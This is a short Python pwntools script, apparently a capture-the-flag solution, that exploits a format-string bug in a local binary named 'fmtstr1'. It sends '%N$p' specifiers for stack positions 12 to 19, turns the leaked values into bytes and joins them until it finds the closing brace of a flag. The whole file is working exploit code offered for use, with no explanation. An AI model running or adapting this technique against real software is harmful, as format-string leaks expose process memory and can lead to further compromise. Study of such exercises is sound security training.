#!/usr/bin/python3 

from pwn import *

context.binary=elf=ELF('./fmtstr1')

flag=b''
for i in range(12,20):
	p=process(elf.path)
	p.sendafter('string: ',f'%{i}$p')
	pause()
	output=p64(int(p.recvall(),16))
	flag+=output
	p.close()
	if b'}' in output:
		print(flag)
		exit(0)

p.interactive()